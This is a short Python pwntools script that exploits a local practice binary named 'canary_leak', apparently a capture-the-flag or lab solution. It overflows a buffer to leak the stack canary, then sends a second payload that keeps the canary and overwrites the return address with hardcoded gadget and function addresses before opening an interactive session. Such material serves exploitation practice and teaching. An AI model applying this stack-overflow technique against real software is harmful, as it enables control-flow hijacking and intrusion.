#!/usr/local/bin/python3
from pwn import *

p = process('./canary_leak')
payload = b"a"*57
print(payload)
p.sendline(payload)

tr = p.recv(57)
canary = b'\x00'+p.recv(7)
print(canary)


pl = b"a"*56 + canary + b"a"*8 + p64(0x000000000040122b)+p64(0x0000000000401166) 
p.sendline(pl)
print(pl)
p.interactive()


